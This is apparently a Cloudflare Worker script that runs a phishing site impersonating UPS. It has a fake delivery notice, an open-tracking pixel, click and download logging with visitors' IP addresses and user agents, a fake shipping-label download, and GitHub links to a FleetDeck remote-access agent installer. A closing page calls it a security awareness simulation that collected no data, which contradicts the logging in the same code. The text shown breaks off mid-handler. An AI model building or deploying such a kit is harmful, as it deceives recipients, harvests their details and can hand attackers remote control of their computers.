var GIF = 'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
var LABEL = "<!doctype html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">\n<title>UPS Shipping Label</title>\n</head>\n<body style=\"margin:0;background:#fff;font-family:Arial,Helvetica,sans-serif\">\n<div style=\"max-width:640px;margin:0 auto;padding:24px\">\n<div style=\"font-size:30px;font-weight:800;color:#351c15;letter-spacing:1px\">UPS</div>\n<h2 style=\"font-size:18px;margin:18px 0 6px;color:#121212\">Your package is ready for delivery</h2>\n<p style=\"font-size:14px;color:#444;line-height:1.7;margin:0 0 18px\">We could not complete the delivery. Download the label and confirm the shipping details to release the package.</p>\n<div style=\"border:1px solid #ddd;border-radius:6px;padding:16px;margin-bottom:20px\">\n<div style=\"font-size:13px;color:#666\">Tracking number</div>\n<div style=\"font-size:17px;font-weight:700;color:#121212\">1ZV551D60337320914</div>\n<div style=\"font-size:13px;color:#666;margin-top:10px\">Ship to</div>\n<div style=\"font-size:14px;color:#121212\">Delivery address on file</div>\n</div>\n<a id=\"dl\" href=\"/c?to=/page\" style=\"display:inline-block;background:#ffb500;color:#241c15;font-weight:700;text-decoration:none;padding:13px 26px;border-radius:4px\">Continue to delivery details</a>\n</div>\n</body>\n</html>";
var SHA = 'a7e0202cfee2ef35676ea2eb296587028f9ea00ef2085d9d0b3be5ec212ad35c';
var LOGO = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJYAAACWCAYAAAA8AXHiAAAAAW9yTlQBz6J3mgAAAAFzUkdCAK7OHOkAACJESURBVHja7d15mF1VlTbwXw2pqswDmQkJAZIwI/MMDQIyCqiAKLSAtjRto0iriI2KtgoN0oLTJ4qAKPMgkADKLCBjmAQZkpCQeSZJJalUavz+WOekqpKqW5Wqe6sqyX2f5z53OvecffZ+79prr7X2WgX19fXyyCPbKOzqBuSxeSJPrDxyguIO/fqpgq5uf0dQgN4YiL4oS17DAJQ0OrYEgxu9X4KqRu+rsDx5vQyVWJm8Xo1NV984on1N7xixui96YWtBhrHJ66EYljwGY0hyXB+U5qANa7EKFVgsyLgweSzCXMxIPp+bHLfZYFMnVk/sjB0wDrthuCDTNl3cttLksVUb2jJbkGwB3sJUTMM7WNPF99EuFHRoVdi5U2FfbI8DBYkOEAQa3pmN6GQsEIR7UZDtBXwgptnOwWY4FfbCQdgved4LI7q6UZ2M4cnjwEafzcdreB4vJ8/dbhrtbhJrDxyFwwShNmdplC0sEAR7Bo/jzayevZ0Sq6uJVYTDcSKOFMTKo2N4E09iEv6G2g6dbRMj1tE4CZ/EmA7deB6ZMBMPYiIea9cZNgFi7Yoz8Cmxksujc/EO7sOdeLvNv+qmxCrGafgCPpHNXsqjQ/gr/oC7UZPxyG5GrG1xjiDUtjntojw6gg8FwW5OXm+IbkKsffDv+LxwkeSxaaASt+I3mNzkm3YSK1tO6IPwZ7yCL8qTalNDmRi3V8Q4HtTRE3ZUYu2Di3FmV/dMt0WhcHcTxpUeyXNx8lyUfJ8e03gSyKTCFgjXduPhq2/0XI86YWyoFZpUbaNH4+Oap8Dt+D9H1E/WDnSUWNOFW2XLRb0gT49Gj9RLWCDiHqrFYFZSXU7FGioqWFVBRTUV5VRWsraKFSspLqK2lmXLqaujoJl5pbaW3r3o1zdew8ABFBbSqydlfelZSK9elJbSpze9ykQ8R6kGUhcnbV4gXOZNfTEzHFG/XXu6paMuncrcjlo3Q4EgUU/hcCoSATW1WB6kWbaMhQuZv5ily1iyiMUfsXgp5atYWR6kqljDqqrwxaTCpU4IllQY1cgcb1MoBjA9pkfyXJQ890SvQspK6d07IVwv+vZhUH/696VffwZuxVGHMniE9V3e7R7fjhKrqoO/776oF71TKgJreiZ3u4Y1C5n9FnPmMW0G8xYwZ068X7aCldWsEKNSpGE2LBQ8TAVFcXLqFI1nRDLPhGkT6xsdt/6sVouVdaxYQ/WahhmxrtGxlXFLnh7O4F1EAE8D2j2+3dkJ3fkoFFNFb6HOrqZmEVP/ybQpvDON6R8wax6zF1EuBqZG8K5MEKdYBH0VyW2EX2vES/8XmVAlAsfKSrVm0doobLnESnWjUvRPnitYPpv3p/D6W7w3lffeZfaSiMarE2TpJbi3laa6eXOX2FKx5RGrQDBjgGDJQv75MpNf47XJvPkes5aFNCoUQWC9RKReqvvk0To2f2KlSkgfEdFeQ8VcXn6GF57npdd578OQSEWCSP2SQwuaOVUebcPmS6x6Mb0NRg+qP+T5J/jLM7zyGlMWRhhmPzETjpUnTjaxeREr1ZsGCsYs4aXHeewJ/vYM7ywNZbu/0I+GrvfTPLKHzYNYdUI6DUUB897locf4y2O89n7syxqoc1ZqeQQ2bWLVi+XZUKzgpSe450GefIoP18byf3DyaOztyCP32DSJVS+07MGYx8Q/cOd9PPdW6E1DsF2jQ/Nk6nxsWsSqE2aCQdTM4d7rueUOXp0Z5BkmSJUnU9dj0yBWnTAXDGftDP54M7ffy+vzG7Y8F8oTqjuhexOrTihKW2Mhd17P725i8oJY9G2n+eiRPLoe3ZNYqe9kNNYy8Y/89iaenRGEGpcclidU90X3IlbKlCHoy1tPct3vmPhSTHU7yLtVNhV0H2LViRCBkaycys9+xE13h89utIg1SsM98uj+6HpipUzZGnXcdyPXXMfb5fHREA1BcHlsOuhaYtWJZd1I5rzK/1zNPS/GAnCChsjKPDY9dA2xUl1qBIq47Zdc8TPm1MYmxHTay2PTRecTq06EWY5hyT/47hXc8Xz48saL8Nk8qTZ9dC6xaoXlfDBP3M6lP2RKRYSs9NDRtCh5dCd0DrHSqW8brOHHl3DdXRGQMEFeOd8ckXtipTFSY2Pqu/A7THo7chf1lpdSmytyS6xGq76X7uc/LmX6mpBSBfKk2pyRuwICtUIjH8GfruFTF7FwTSjo5A2dmztyI7FqhSmhlh9dxNUPRCzeIHkptaUg+8SqxWjqlnH+V7jt1cihXSZPqi0J2SVWHYazdDpfuoDHPwx9qkh+1belIbvEGsCCGZx1NpNXsJN8aMuWiuwSqw8z3ubNFeGa2dSl1PrppdJHgYZEM43TXHUW6kVmpGqRd6EuaVOJMDSnCUe6Etm9fi2lvUJJT0lVkLxe3agDWkIaMNpTZlJu7DlLhdWjNaIXiLRCK5NHmYZEM4NK6Nubnj2pr480RMvLWVUXu6jT/YoD5MbXWZjc79Lk3APRv5ixAyOhR3V1tGfFmtjuVp7c88A29GcukHNi16GwgMElFBVkVuBLClhTTVVN62QpwOBSigupyTDXlhZQUUNVdfPnTHOjLU6eR+KgCey5C2NGs/02DB4cuaV694xBrMeaSlauYcUy3vmAd6fwyssRh18pFsVlOj6gRaI23RKMwqkHc8Ce7DGBocMZ2JuSHtTURHtWljN9TiQzef5NXn07MhMNEcTvLILlnFirMLI3N1zH4FHUZCgvVDqCu27ku7+PWictkWu1INVNv2ToGGrKWz5n2Tbc+3u+8dsIGExRKKaSOeKffeROHHU0hx3EdmPFVukCwZL1Uy0W0GMg/YrZupidjxZsm8ezr3DHn3nouagdl5b92lg9szC51FSMKeLLZ/GpE9lu56TBFRqyBdbFn7a0mME9GHsgHy/hK8t4520e+At338XUmuiDUrknWOdIrELGjqFwO/H3awljGLJV62ma0nNuO4YeO7Ryzu0ZMrhpBrEikRhtOU7dn7PP5NBDxRy+Uswjs7U+z6ZIE4/04tBTOPQ4znqSq6/lyWlBro2ZjoqSZszD6fvw399hzN7Jh0s0KHqttacHO+/Dzody9mlc+3MmPhWkzbVOmHNiFQidZEU5A5eJEW0JH4Xu0po7oPE5B7fxnI07shwD+nDttzj2jKQX5mO6jUupt/5xFaIIXAkHnsB9B/O/P+Gqu2Nv7QCt2/IKk9v5CD85J9xg6kX1wvRarbUr/b46ua8CRo3np7fS/3x+NTGic3NZFHCLrAm9HLuM5thzkjczhEjLRk8XCokyDXVccg3XfSUus1zmDi8QaRsX4doL+I8fJz+arW2EaumkBMGqGT0iq4n7WkRXr0q7BEWoqhWZgqvk5u+Vat2VnHUZpfV8+ddhEijTvM5VLzj0vZP53HdEiaUK2Zm3CrGW1RWdI022SIlFTKXtstxujOQoFCJoOqddyiXHMivDoXNx+NZcfLkQWxXaNkKp0lTUxuM7AVukxNoopNmT01R/9Y0+WyUUorVaHtCUXIv59hW88g7PzYp4tMbKfCo4v3+RMD5NlVlSpWkHthJz21rrFHalQpFcYd0qtrORJ1ZrSAZr8VRef48FC6muYsggdtyR8Xtal/Vm3fHro1BYNneI6NmPfyWsGCWNfrIIR+/AXkcL0dUSqVIpOwoLefR23vwnC+dSUBC2rfHbsu++jNxVw8KkunO7LU+sTCjAUO65kW//nNXVDTp+gbBO7LM3l13ATkeIea4lE0URZrLj8Zx9MNf/PVIFpGHZa3HCcUJaLZU5FfNo3nqCb1zZkGknLR6QWiJGFXPAgZz1GQ4+xrrqGJ3lt+0mM3I3Rg9mTmdudVjTtxObP8bEVya9yglf4uUHhMEq08jVoIrzzwshlxaBqBLxanvtIabXTKQazrSX+PQFvDwz2rGdEGCjGrWtsoY7n+WMr3HxV1kxD9t3XoqCPLFaQx29+4Q7ZP1USWXYUUibsy9m/hvCJ9TSyBViQVjGj90zFqWpcX9kH8ZsI9wKLaE4fvDz62K2HG9DoqSve4tcFwPx28c45gxm/JVtRnZOt+WJ1UHUCkkxD1ddKUY6k4JRg14x7aUkXYthw+nRW2ZdqCdrZ/LWe+sCdDMidcDvglkrOO/TTPxLuMtyjTyxsoAkaNakyXz4d7FSawkFWMphBzKhJLw0deiRlpfLNE8Vhx2qqmrjTFtp++ZV8eQ/wtWY64VinlhZQi+xsnv4qeRNJqyk1/bsvUcjN2db7GM1UR6upGTjree1wmIyQOeEiOeJlUX0wiuvC7b0yHBgLcr42O6JQ134M1XLPCJrKNmWvXdnoc4NLtxY5ImVJdQL++m0D6KkSsbixQVYy247x2+KsWQxaytkJmQSwnrhheFEnqP7kitPrCyiFIvX8sEssSzLhErGjGJocZBySQXzF8pcB64ACxmzH7dcE9z9oNFX3Ql5YmURJWIWnDNP64UCKxkyhJHDQhAtxFvvCEUokwJfgFnsfyqP3MwB2/K+8OB0J+mVJ1YWkcbiL06LG2YSI1UUDGTokAZF/PEnhVGruA0XmcH4g5l0Gz84Jz6eqnU1rbPQHdqw2SDNf7K8XOu+ucQPM2RI8GQYHprMh88LI2tru0kK8GGc4+Lv88htfO7wkHxzZS7Q2RnIEysHWFGubWHNhfRPikL3FDF9//tzDcU6W/O9FIk5cAZj9+SX1/PHK9hpOO8J4ddVA5wnVpZRIKrUt0qKehTRv39DrtVtcOeb3H212JjZllJlKXnnYjFHn8kj93DxJ0N6LdY1uleeWDlAcVtjRgqTIt8Jegjn9MXX89KfhDOwrXXw0m1HU+nRl8uv5ebLY+U4U+eTK0+sHKC2rabt+qbHphtRi3Dmt3jhVuFJ3pgNikVCTM3h+C/x4B/Zvn+E9XcmufLEygHaHfYsjPLDBI/O+CZ3XSc8zoO13ReTSq/3GXcID9zKhH5Brs4KwMsTKwcoTsJbWkUBRc2IkZRcpfj3q7nsq9RWCOlVqG3SK105fsDg3bj9eoaWRKhOfjPFJoqatnqI66isbP6rNCHiNvjFJE44jRcniTCFodpe/6UQUxl1GL+5NOII13ZCH+SJlWXUi8QhbdpUWhs2r5YOTVPij8ebc/n0hXznayybK6RXWzKdpNeaziHncu4BscUs1wOfJ1YO0K+vhnDTTKijfGXmQ1J1bbSQYL+eyHGnccdvhPtnuLal0VmLSr7+lRB4FTnugzyxsog0Tm9gf5mjFFJUs3hp29SxWmFEHY8Fq7jgSv7tXJbP0pCMLBORC7GQkXtz7L4RO5bfYr+JIM3FMXSI1u1PJShn6dKGbWBtOX+dkDhjcdcrkXti+otiR0VrErIGPfmXw3NfACtPrCyiSkRobj1C+FMyoSdLFjJ3fusBp+sjDQ6cgA9W8qnzmPuatvkYV7PbTkHOXCrxeWJlEWsxpAfbj9a6ElPKrLksqm49wqYl1ImM1B9U8a3/EmQua+VHaxgxnMFlTVM7ZRvdjlhttlp3Q5Rj3Dh6b61h02BzqEcZ702N33TEaFkjyPXETF78q8wbOZIf9OrFgEG53Rydc2LVi1SRhW3ZKVlAWVnb8511J6QpiPbdUwxuplErQhVvvp2d1ArFybVffE3r4i+5WEGOOzjnxCoS3v41lVp3VhUwaGDb/a7dCZWCT0cdIrO0gp7Uz+WNN0Mnk9xve/NWpVsZF6VZdlsb1U7o3JwTqwQraihfpfXlzxrGjIicCJ1hHc4WikTUypE7M/4Qkc6xJdRjEK++wT9XxGYKKCkKtWyx9gXp1aJvH9HHmYiTRCMWFOSWX50isVZjUVsCg8oZuxvjR8bYdDsFsBkUik2nRbjwAqE8Z9KKkyTxjz0Z7pXi5PCaQn74n3x8Av8UQq+t95+uEj+2c/JBJsYUUVVJ+fK2mdo60i85xbrcYzPFnWS66bUYzNmnx6aENOVTc1hdSW1rSV474d4qRFbI732a3Y/XEBfcEvpTOYVHnoqAhbQ7PqrmyEO5cRIXnRTRpNO1HsNeJKIW9u7LkceLTDWZ0DNMHItWtX812ta+yd7vC6ita6p8Fwjd4f0pyYtMV6zHAk49l4sP412xd26VGMDlYtxmYEBfevaT+229RZSviGjMKg2ZuSvE1qs5uPwULvwfMY9lUpQS6+akSbxV0aBfpR05fSb68uP/466fc/w+cc/ThKV8/czgK/E2hhTys2soHZ58mAm9YzW6UMya6d6M2uZXTO3mR0fDc5p2Yy29e8U/oVaDqO2Pya+FwlrQW8sZVdLSEGVccR3jfseDjzJ/JnU1jBzA8JHsuw+nfZJ+afrsXGINu+/JwZNZOi/MA4XoV8iJu/OF0znyVA3lLDIlTBuA2Vx/a7j51l8oFxUJHWAJBx3LQYfz6gs8/ASvTuaDGSHJ0/EfVMZ5B/Dtf2PrfbXuXS5EFc88ty4yWpUYr969NPcnbXce3I4Sq2nq/hr6942GNl4Y9cc/VvDyK+z/GZlzQBWJXNR9OO/rnHcm8+dQU8uAfvQdngxQRTII7c0m3BbUYxHHnsgxhzB1Bos+orSU4cMYPS5py3wxQq3pkMP503d5aVlYzZvVCtJ4q1koZe/D2fsILOCDacxfSnUlZb0ZO5rhafjyrFb6IVk0lL/LY883TMNpEdwBfTVHowylGTKjo8Rqmro/GfxeZaxq5NIoFrrCHffERkvFMk9hRYKZs6NzR+ykoTZJpZh/0kHINQqwksJ+TDiICaktpFp0ezqgmdpSizEseo4f3xxBfK0ijQKdn7wvY/v92L5xVppKMVe2pmKkGMStP2FaTWQTrE+aVlaSRGRsOCbL2nDWFpvfESxo8q4mROqggU0XRvXCjfXnV5j6hIgBaatutFZIsKViqunkXJrrpMBqoejMT+56adKW1qRlnRAPVXz1v1lcH+aUjV7qVwodbkGjNizXNgtrksRr2WR+dXfU1UlRhUGD6N1bcxJrgXaio8Sa0+RdNfozbOiGPtgyIYS+daUgyGC5L+iSKBKlJV1kcK0VU+UALr+Ihz+ICJdO9VrVCsttLV+/lPm1TYldKcaroJ/m/rRz2nyd9dBRYs1s8i4h1tYjNjRw1glB9eRMrrhE3N0AuevlNF31EKrWdgGx0sD1AVz9Da59PEJdmhMu60rx9NS2AMGNacMgbMWVl/Dnd6MNjbt8rSQaY4DmiDWzDVdpFh0l1rQNPilg3HYtm6y2xf8+wlVfE1r9KNkrw5qeo58I3cUfvs3VN8VU3CmoEzrkOOpW8Y0v86N7I3a9tIXbTBZrsTV/hAaR0t4+SX87Ji56xVe5cmK8LVjvsB7YftsWzzRNO9FR5X2KWJ81hBRVs+O4EBa1612gPuncbXDF/cxazHcvZdjuQl/4SPumx8KkBUnk5toPefBe/ngbz82McRqsA2vndDRaG+gy6zY6PD+JH/2E5+dFDF6m4pg9RNajS67kzCmc/Vn6jRe6w0c2zr9VKKa+/sx8me//mPtfX8exJm1IV4Tjd9DczFEhxrdd6CixPhJ2zL3XfbKacWMZWcbCygZfWOOb6SlE8u1/58VTOe9cTj2WEeOTL1MLZJWGNXFBo0dafSHtqbWsms8//s5Tz/D0M7yxNL7eToORtl2osU5PUpe0qUZDdYqS5FGLpTwzibvu5cFn47Dx2hat2QcLlnPZjbF6Pul4PvEv7LGH+Cem6ZXXNLp+4/7onTxXMvdd7niQP9wSSXe31/yusdXYupQdt9ecbfHdZHzbhWzsX3xVY2JV0Hc0u+zItDc2JBYNvq0dhCvju7/lxhs5ZF/235+x2zJmGIO3orCYopLozJo66qtZtoIlHzFvIR/O4Z13+McUpi8OwTdAg9jv8Cw7kGcfZep8dhvHVv1iaV5UxMqVLFnBogW89j4vv8Yb02OMRtq4gpPpdq+BmFfOlXdwwx18bBx778VeE9hmNNsMCxtWUaJr1FSHZ2DGXKZ8ELbCZ19kem2s/rZPzt1cH6zE4ePpv63mDM2vdqTbskGs5/Hlde+Sf/i+e3LHG5kTATdaNFlZw+0vcNsLYZUeWkzfflHwcqsBEXazam2cf/VqVlTF3yl1F/YRJB7U6PwdVtsKMJC/v8SlD8YfoR96lkW71qyhvD5K1qT1rAeJAW1PTHna3kEaIjxemMpTUxvyOgzuS3EZg/pQXUP5GtauZkFSCzr9/faN+rilW6vEvnslA7BhzcfnO9J12SDWUxt8Uslh+7PVTdE5maJl0s7skzwIsiyrYfFH8f07S5pWii8WHT1CJ/igaxjQPxZ4vcRMtKqyYSYstWFRyY4SOv19ibhu6s9bi9krqVvJ+4sb4rCKhAbRr5lztIQ0Pv/Q/ZITb/iDp3QA2SDWLLyJPdZ9soxxe7HX1jw/N3OxhpYa1Wcjju8s9JDbUJOWkKpTZVoPaW8LklTz9h3OTntpTpN6U8sV8NqEbDlFJjZ5V4khHHNU5goeeXQdVuLYo8WG1w13FE3c2POtj2wR6+4m7xL/2snHhVF0Va57KY+Nwmqx0PzksVqKDrl7Y87XHLJFrH/gjSaffMTQvTn+kHBtbQrRoFsCCsV4HH8wI/YV02BTRfUNMZ4dvk62cEOTd7Wo49zPhVLZ2v7NPDoHlcLkde6ZyQcbLhtv2JjztYRsEusPGodhFWA+E47i5I+FJpiXWl2LQhGJdPIe7HS0EF1NpdUaMY5ZuVa2sArXN/kksRBfeEF4W1bb9PYLbi5Idtfrg69ekHywodP5ellSibMtRK7e4OzzGH8M5x/TepBjHrlDoej/Lx/JhGO0tOnj6o08bcbrZRPz8Msmn9RhJRd9k/HFnZeqMI8GJP9vE0r4r0s1FElsil9qKJmelWtmG9/VOIA0KdHeaxxXfSvkbKW85OospK6b1fjpJfQaLyJRmw5AlRi3rCEXxFqOyza4u9l8/Et89YjYNpUnVufhA3ztCP7lXC3pI5dpcDVmBbmala7GO+vepakKV3D5VRwxPCLIulO1qs0RRYJUR2/N968SjuYNdwG/I4u6VYpcqjtnbHClJejPDb9mm+L483RW3vEtDemOsG1Lor/111LegjM27sxtQy6J9Ta+19zdDt+LW38ZDtW58uTKNopFv/bC7f+PwbsLlm04RXxPjFPWkesF2v/g6SafJKmhdz2Ou69p6IT8tJgdFImtNT1w5zVM+LjISbChXvW0GJ+coDNW/ieIVAGBNPJvOvuczl3XRifMlidXR5FOf2WiX/c5XZAqjbtpwEIxLjlDZxCrAp/Q2HKSRq5NY99T+POvoxzHVLndMb+5Iu2zqRhRxv3XR7+aprn0iHU4Wo5TvXeWrfJNHL9Bb9RhOnscz8O3c9DYri/guKmhUPTXuzh0Ox6+k12PETmQms8gczze6ox2dRb+itOafJLe9DRG7sbEW/naSeEbTUNtciG9alBSInZcjBbBSS09xtK/Xwd2+eQQhcKTsUDk1HrgVobvKFNp+9PEOOQcBfX1HYjQfqpdw/4ZzQWS1YrdAn159A5+8FPeWh7j3taSMW1FOcYN5V/PRg31GU5e1I9nHuWRV5rms+pKpMnsZmGnvnz/mxz3+eTGlmhJWT0N92z0xY5oHz+6gliE4ni/9S0NdUKT35by97jiF9wyKaRFurUuGxumi8T0sagN5ysQu4YG6Xqplfb2nKTdZ3+Cy75O/x0Fy6o0NwfV4BQ81K6LbmLEgj3xgOBMU6R1PXry/MNc/SuenhISI91alQ2CtVUKdvWCIr3+UiGQDhrDt7/C4ScLMi1ssZGzcTJeb/fFN0FiEZvB/4jjNvgmzYGwDT7iplv4zU28vyq2fXVGlsjugDTP6WxsV8L55/Lv54h9YbNlSlL6CM7WelbSzNhEiZXiu/hhs9/UCRYN5aN/8vPfc+t98c8dJfbT5TobUlegULj15iS3/9kTuPDfGLmniE5YLtPS63uyZfzcxIkF++EXyXNTpHPfEPRhygv84kbufzKU2NFCuG0OBCsUknhO8vqEA/naF9ntCHGzqam5+a5/GRcmz9nBZkCsFN/GjzS3tkmS3xsRr//+KNffwqNJloERMmd16c5IzXrzhbZ9xC6c/wWOPE5st54nU0rIWhH6cmXWG7YZEYtIkflj69u9UqSrx6QY0qMP8bubeea9YONI2VtB5hppD84XK9X9x/Dlczn5ZDEHzhNzYsvT3t34b2F4zz42M2KlOBXf13j7fmOkmThGYBkTJ3H9zbzwYehew2Q3QV42kRJ/sQiTOmAUXzyH005IGr5QhH22TKg38QP8OacN3UyJleJifEtLCYfTDGIjsIC7J3HzLbw4u4F33UWCpe1YKMK09x7GWZ/jXz9F4WghulbJRKiFuAr/1ykN3syJRaSOuhTf0JLqWiesmcOiWMHdD/GHW3lxZqgpw3VdZbFUh1okdPC9RnDWGZxxCqXbahBdLROqHj/FFTqQJnujsQUQK8UEfBNfbPGINLHtcMzjvoe49S6emxrjNlznKfnpKm++UJX2G8W5Z3P6CUJHXKI1QsHvRfjw+53Q5KbYgoiVYl98R7grmkcjCWYhDzzEzXfxwnvx1UiRgyoXBGuc/78OB+7AZz/D6SdSNEqIrjQhR8vdeD9+glc6s2ObYAskVooDxRR5UotH1ImEBcOwjKef5IZb+dsbsRIbIXSxbBAsNWzOE6Q9dBfOPoMTjhV2uJRQmSXURDHlvdCVHYstmlgpjhUK/hEtHpFm1h2Gcp55mptu46nJERgwUvsjKVLXy/zkHEfuxedP45ijhXa4SGurPCKL3lX4S1d35jrkibUOR+EimUJvUzPFcKxl8rP86R7++ngQY6jY1EJmRT/1+64QS7VhOOYIPv8ZDjhMMGyBtuzQfQjX4vEO3PeRwiyzCk+IUL+OI0+sDXCcUPIzS7AegmB1THmV2+7l/geZWduQZJamBEvvOi3xM6aAk07krM+w435i6blAS2EsTXpQKOWPdOA+d8btYrH5vpCPh+JR2djalSdWizhc+M8+3eIRafG+oejBvLe4837um8g7y2L2TL5SLSwDFdipP6eeFCaDUXs0+rL1yq/3Cr/o3zp4b7uKMOOJQtHvJaK7Z4ldOIu1ZFxuK/LEahUHCoKd2eIR6W6WJJK1fCr3PsQ9DzJ5RoiEMuwzhtNO4dTjGTBBKOOLNbcbZn3cLgiVLaV8tohp+8/k6u8LIfsD/Cr57DLhHmsf8sRqM/bH+fiCliaqtEsGiIllIQ9M5LFXOGpvTjlJaPofach40HJX1IlkZtfjpSzex6Eifr1X0tK0+Oo5uCl5/UXh0B/R7qvkibXRGI8vCZL1a/Go1FQxQExxxYJMra/wygWZbtCBmjQZ8B0xve8tQtNmY5JYQ7wlSDVKSMf9NJTU3Di0k1hb8u72KcI88TNRWeM/hCrVFOnOhXRPWp2G8J3msQi/xm+1dzDbhjUaajPUC6qfmHyexrRtJbTHjSnzlBXkt+/F4P9AuIouFsrvhkjr3Lb8B34v+f2E5Hy5JBUhnXYV0naukKtfF2pgmj3mS8Ia0u5iS+1FnlgNWC6k1874rPVzTrSMp5Pjd05+v7yT2jsVD4to0ZLk+TfCnvVJsUj5TyGVOx15Ym2Ietwp7F+H4Y4Wjrsj+f6I5PiuCJr4pJicl+E2sQV3qvAt3obLZaHKRHuwJSvvG4NdhanieCElfiFH6X/aiSuFQbhArBLn4jrc1+Ezd8mqMI88WkB+KswjJ/j/c5Jl9S7SMaMAAAAASUVORK5CYII=';
var FLEET_PRIMARY = 'https://github.com/jobongriff123-lab/fleetdeck-agent-installer/releases/latest/download/FleetDeck-Agent-Setup.exe';
var FLEET_FALLBACK = 'https://github.com/jobongriff123-lab/fleetdeck-agent-installer/releases/download/v1.0.0/Agengminiups.exe';
var FLEET_URL = FLEET_FALLBACK;
var fleetChecked = false;
async function resolveFleetUrl() {
  if (fleetChecked) return FLEET_URL;
  fleetChecked = true;
  try {
    var head = await fetch(FLEET_PRIMARY, { method: 'HEAD', redirect: 'follow' });
    if (head && head.ok) { FLEET_URL = FLEET_PRIMARY; }
  } catch (error) { void error; }
  return FLEET_URL;
}

function cookieUid(request) {
  var raw = request.headers.get('cookie') || '';
  var parts = raw.split(';');
  for (var i = 0; i < parts.length; i += 1) {
    var kv = parts[i].split('=');
    if (kv[0].trim() === 'drill_uid') return decodeURIComponent((kv[1] || '').trim());
  }
  return '';
}

function log(env, event, uid, req, extra) {
  try {
    var ua = req.headers.get('user-agent') || '';
    var ip = req.headers.get('cf-connecting-ip') || '';
    return env.DB.prepare('INSERT INTO events (event, uid, ts, ua, ip, extra) VALUES (?, ?, ?, ?, ?, ?)').bind(event, uid, new Date().toISOString(), ua, ip, extra || '').run();
  } catch (error) { return Promise.resolve(); }
}

function upsPage(uid) {
  var html = '<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">'
    + '<title>UPS My Choice</title><style>'
    + 'body{margin:0;background:#ededed;font-family:Arial,Helvetica,sans-serif;color:#121212}'
    + '.wrap{display:flex;min-height:100vh;align-items:center;justify-content:center;padding:24px}'
    + '.card{background:#fff;max-width:560px;width:100%;padding:34px;border-radius:6px;box-shadow:0 1px 5px rgba(0,0,0,.14);text-align:center}'
    + '.logo{margin:0 auto 18px;display:block}'
    + 'h1{font-size:21px;margin:0 0 8px}.sub{color:#444;font-size:14px;line-height:1.7;margin:0 0 20px}'
    + '.btn{display:inline-block;background:#ffb500;color:#241c15;font-weight:700;text-decoration:none;padding:14px 28px;border-radius:4px;font-size:15px}'
    + '.alt{display:block;margin-top:16px;font-size:13px;color:#0662bb}'
    + '.meta{margin-top:22px;border-top:1px solid #eee;padding-top:14px;font-size:12px;color:#888;line-height:1.9;text-align:start}'
    + '.ok{display:none;margin-top:16px;font-size:13px;color:#1a7f37}'
    + '</style></head><body><div class="wrap"><div class="card">'
    + '<img class="logo" src="' + LOGO + '" alt="UPS" width="96" height="96">'
    + '<h1>Action required: verify your account</h1>'
    + '<p class="sub">We could not deliver your package. Confirm your account details and download the shipping label to release it.</p>'
    + '<a class="btn" id="dl" href="/download/label.html" download>Download your delivery label</a>'
    + '<a class="alt" href="/c?to=/page">Verify account details online</a>'
    + '<div class="meta">Tracking number: 1ZV551D60337320914<br>Ship to: Delivery address on file<br>Service: UPS My Choice</div>'
    + '<div class="ok" id="ok"></div>'
    + '</div></div><script>'
    + 'document.getElementById("dl").addEventListener("click", function () {'
    + '  var box = document.getElementById("ok");'
    + '  setTimeout(function () {'
    + '    fetch("/count").then(function (r) { return r.json(); }).then(function (d) {'
    + '      box.style.display = "block";'
    + '      box.textContent = "Download started. Reference 1ZV551D60337320914";'
    + '    }).catch(function () {});'
    + '  }, 800);'
    + '});'
    + '</script></body></html>';
  return html;
}

function donePage(uid) {
  return '<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">'
    + '<title>Security Awareness Simulation</title><style>'
    + 'body{margin:0;background:#0b1016;font-family:Arial,Helvetica,sans-serif;color:#e8eef6;display:flex;min-height:100vh;align-items:center;justify-content:center;padding:24px}'
    + '.card{background:#121a24;border:1px solid #22303f;border-radius:12px;max-width:560px;padding:32px}'
    + 'h1{font-size:20px;margin:0 0 12px}.ok{color:#3fb950;font-weight:700;margin:0 0 10px}'
    + 'p{line-height:1.8;color:#93a6bb;font-size:14px}code{background:#0a0f16;border:1px solid #22303f;padding:2px 6px;border-radius:4px}'
    + '</style></head><body><div class="card">'
    + '<p class="ok">Simulation complete - nothing was submitted</p>'
    + '<h1>You interacted with a simulated shipping notice</h1>'
    + '<p>This was an authorised security awareness simulation run by your security team. No credentials were requested, nothing was submitted, and no data was collected.</p>'
    + '<p>Your reference: <code>' + String(uid || 'unknown') + '</code></p>'
    + '<p>What to do next: never download a file or enter a password from a link in an unexpected email. Open the carrier site yourself or report the message.</p>'
    + '</div></body></html>';
}

function subPage(uid) {
  return '<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Unsubscribe</title><style>'
    + 'body{margin:0;background:#ededed;font-family:Arial,Helvetica,sans-serif;display:flex;min-height:100vh;align-items:center;justify-content:center}'
    + '.card{background:#fff;padding:30px;border-radius:6px;max-width:480px;text-align:center;font-size:14px;color:#333;line-height:1.7}'
    + '</style></head><body><div class="card"><h1>Unsubscribe</h1><p>Your request was recorded. You will not receive further messages from this campaign.</p></div></body></html>';
}

export default {
  async fetch(request, env) {
    return handle(request, env);
  }
};

async function handle(request, env) {
  var url = new URL(request.url);
  var path = url.pathname.replace(/\/+$/, '') || '/';
  var uid = url.searchParams.get('uid') || cookieUid(request);
  var key = url.searchParams.get('key') || '';

  if (path === '/o' || path === '/open') {
    if (uid) await log(env, 'open', uid, request, url.href);
    return new Response(GIF, { headers: { 'content-type': 'image/gif', 'cache-control': 'no-store' } });
  }

  if (path === '/c' || path === '/click') {
    if (uid) await log(env, 'click', uid, request, url.href);
    var to = url.searchParams.get('to') || '/page';
    return Response.redirect(new URL(to, url.origin).toString(), 302);
  }

  if (path === '/page' || path === '/ups') {
    if (uid) await log(env, 'view', uid, request, url.href);
    return new Response(upsPage(uid), { headers: { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'no-store' } });
  }

  if (path === '/download' || path === '/download/label.html') {
    if (uid) await log(env, 'download', uid, request, url.href);
    var headers = { 'content-type': 'text/html; charset=utf-8', 'content-disposition': 'attachment; filename="UPS-Shipping-Label.html"', 'cache-control': 'no-store', 'x-content-type-options': 'nosniff' };
